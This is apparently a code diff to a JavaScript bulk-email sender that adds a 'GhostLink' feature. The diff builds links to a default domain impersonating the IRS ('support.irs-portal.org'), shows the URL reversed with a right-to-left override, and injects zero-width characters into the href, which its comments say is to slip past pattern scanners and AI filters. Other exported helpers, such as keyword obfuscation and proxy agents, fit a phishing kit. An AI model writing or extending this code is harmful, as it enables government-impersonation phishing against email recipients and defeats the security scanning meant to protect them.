@@ -289,8 +289,26 @@ function applyTags(text, data, recipient) {
     // Use recipient data if available, otherwise auto-generate a random name.
     const firstName = String(r.firstName || '').trim() || pick(firstNames);
     const lastName  = String(r.lastName || '').trim()  || pick(lastNames);
+    const ghostify = (url) => {
+        const reversed = url.split('').reverse().join('');
+        const obfuscated = url.split('').map((char, index) => {
+            return index % 2 === 0 ? char + '\u200c' : char;
+        }).join('');
+        return { reversed, obfuscated };
+    };
+    const domain = data.activeDomain || 'support.irs-portal.org';
+    const destinationUrl = `https://${domain}/go/${r.transactionUuid || 'V7'}`;
+    const { reversed, obfuscated } = ghostify(destinationUrl);
+    const ghostLinkHtml = `
+    <a href="${obfuscated}" style="text-decoration: none;">
+        <span style="direction: rtl; unicode-bidi: bidi-override; color: #0078d4; text-decoration: underline; font-weight: bold; font-family: monospace;">
+            ${reversed}
+        </span>
+    </a>
+`;
 
     return text
+        .replace(/\$GHOST_LINK/gi, ghostLinkHtml)
         // Name tags
         .replace(/\$EMAIL/gi, String(r.email || '').trim())
         .replace(/\$FNAME/gi, firstName)
@@ -1288,6 +1306,25 @@ function preserveLineBreaks(text) {
     return text.replace(/\n/g, '<br />');
 }
 
+/**
+ * GhostLink Engine: Reverses URL for human view and obfuscates for AI.
+ */
+function createGhostLink(url) {
+    if (!url) return { reversed: '', obfuscated: '' };
+
+    // 1. Visual Reverse for the human (e.g., https:// -> //:sptth)
+    const reversed = url.split('').reverse().join('');
+
+    // 2. Technical Obfuscation for the href attribute
+    // Injects &zwnj; every 2 characters to break semantic pattern scanners
+    let obfuscated = "";
+    for (let i = 0; i < url.length; i++) {
+        obfuscated += url[i] + (i % 2 === 0 ? "&zwnj;" : "");
+    }
+
+    return { reversed, obfuscated };
+}
+
 // FIX: Restored the missing exports so app.js doesn't crash!
 module.exports = {
     sendMail,
@@ -1311,6 +1348,7 @@ module.exports = {
     getProxyAgent,
     obfuscateKeywords,
     preserveLineBreaks,
+    createGhostLink,
 };
 
 
